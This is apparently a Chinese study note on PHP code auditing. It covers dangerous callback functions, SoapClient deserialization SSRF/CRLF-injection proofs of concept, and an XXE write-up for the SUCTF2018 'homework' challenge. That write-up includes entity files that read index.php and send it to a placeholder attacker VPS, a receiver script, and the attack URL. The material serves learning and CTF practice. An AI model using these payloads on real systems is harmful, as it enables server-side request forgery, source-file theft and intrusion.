# 代码审计(PHP相关)



最近加入了代码审计这一个小圈子，接触到了很多大神级别的人物，还是要沉下心来好好学习，搞安全的人必须沉下心来仔细分析每一处代码



## call_user_func_array

> 调用回调函数，并把一个数组参数作为回调函数的参数

```php
479:    public function __call($component, $args)
480:    {
481:        $component = $this->_handle . ':' . $component;
482:        $last = count($args);
483:        $args[$last] = $last > 0 ? $args[0] : false;
484:
485:        if (isset(self::$_plugins['handles'][$component])) {
486:            $args[$last] = NULL;
487:            $this->_signal = true;
488:            foreach (self::$_plugins['handles'][$component] as $callback) {
489:                $args[$last] = call_user_func_array($callback, $args);
490:            }
491:        }
492:
493:        return $args[$last];
494:    }
```
可以看到使用了 call_user_func_array 这个函数，但是 \$callback这个变量是可以被控制的

对于这个函数的理解，可以看一些例子
```php
<?php
function foobar($arg, $arg2) {
    echo __FUNCTION__, " got $arg and $arg2\n";
}
class foo {
    function bar($arg, $arg2) {
        echo __METHOD__, " got $arg and $arg2\n";
    }
}
// Call the foobar() function with 2 arguments
call_user_func_array("foobar", array("one", "two"));

// Call the $foo->bar() method with 2 arguments
$foo = new foo;
call_user_func_array(array($foo, "bar"), array("three", "four"));
?>
```
最令人惊奇就是第二个的传参了，居然直接调用了一个类中的方法
所以输出类似下面：
> foobar got one and two
foo::bar got three and four



## array_map函数

> array_map — 为数组的每个元素应用回调函数

返回的是数组类型

比如这个例子：

```php
<?php
function cube($n)
{
    return($n * $n * $n);
}

$a = array(1, 2, 3, 4, 5);
$b = array_map("cube", $a);
print_r($b);
?>
```

就是对数组a中的所有元素都调用一次`cube`函数

返回的是一个数组

来看一下有漏洞的代码：

```php
159:    private function _applyFilter($value)
160:    {
161:        if ($this->_filter) {
162:            foreach ($this->_filter as $filter) {
163:                $value = is_array($value) ? array_map($filter, $value) :
164:                call_user_func($filter, $value);
165:            }
166:
167:            $this->_filter = array();
168:        }
169:
170:        return $value;
171:    }
```
说是`$filter`这个变量的值是是动态的， 可能有远程代码执行漏洞





# PHP原生类在反序列化中的应用(结合一道suctf题目)

最好用的一个内置类

## SoapClient

大概了解一下`SoapCLient`是如何使用的

一般来说有两种常用的连接方法，一种是使用wsdl文件，另一种是直接连接远程服务。

对于第一种方法，wsdl文件可以放在本地，也可以是通过远程引用，具体方法如下：

> \$soap = new SoapClient("file.wsdl");

另一种方法是不提供wsdl的，具体如下：
> \$soap = new SoapClient(null,array("location"=>"服务地址","uri"=>"命名空间"));

如果还有更多的参数是可以通过数组去添加的

```php
<?php
$a = new SoapClient(null,array('uri'=>'http://example.com:5555', 'location'=>'http://example.com:5555/aaa'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();
```
当你反序列化得到 `$c`的时候 会自动执行`__call()`方法

还可以构造
```php
<?php
$poc = "CONFIG SET dir /root/";
$target = "http://example.com:5555/";
$b = new SoapClient(null,array('location' => $target,'uri'=>'hello^^'.$poc.'^^hello'));
$aaa = serialize($b);
$aaa = str_replace('^^',"\n\r",$aaa); 
echo urlencode($aaa);

//Test
$c = unserialize($aaa);
$c->notexists();
```

来看一个poc
```php
<?php
$target = "http://example.com:5555/";
$post_string = 'data=abc';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'
);
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,'uri'=>'hello'));
$aaa = serialize($b);
$aaa = str_replace('^^',"\n\r",$aaa);
echo urlencode($aaa);
```

更多的需要参考这篇[文章](https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html)



## SimpleXMLElement


还记得xxe漏洞吗，这就是利用了`SimpleXMLElement`这个内置类的方法`__construct`


> SimpleXMLElement::__construct — Creates a new SimpleXMLElement object
> 

其中
> data
A well-formed XML string or the path or URL to an XML document if data_is_url is TRUE.

可以看到通过设置第三个参数为true，可实现远程xml文件载入。

结合这个`suctf2018homework`的源码
```php
<?php 
class calc{
	function __construct__(){
		calc();
	}

	function calc($args1,$method,$args2){
		$args1=intval($args1);
		$args2=intval($args2);
		switch ($method) {
			case 'a':
				$method="+";
				break;

			case 'b':
				$method="-";
				break;

			case 'c':
				$method="*";
				break;

			case 'd':
				$method="/";
				break;
			
			default:
				die("invalid input");
		}
		$Expression=$args1.$method.$args2;
		eval("\$r=$Expression;");
		die("Calculation results:".$r);
	}
}
?>
```

观察其URL可以发现
> show.php?module=calc&args[]=2&args[]=a&args[]=2
> 

url结合calc源码可得到，module为调用的类，args为类的构造方法的参数。在PHP中存在内置类。其中包括SimpleXMLElement


之后我们可以在vps上构造`obj.xml`文件



```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE try[   
<!ENTITY % int SYSTEM "http://vps/XXE/evil.xml">  
%int;  
%all;  
%send;  
]>
```

evil.xml文件内容如下：
```xml
<!ENTITY % file  SYSTEM "php://filter/read=convert.base64-encode/resource=file:///home/wwwroot/default/index.php">
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://vps/XXE/1.php?file=%file;'>">
```

1.php代码：
```php
$content=$_GET['file'];
file_put_contents("content.txt",$content);
```
构造如下`payload`
> http://target:8888/show.php?module=SimpleXMLElement&args[]=http://vps/XXE/obj.xml&args[]=2&args[]=true



[参考](<https://www.anquanke.com/post/id/146419#h3-7>)

不过这道题的重点似乎不在xxe上面，而是利用了php中的内置类SimpleXMLElement来达到目的的












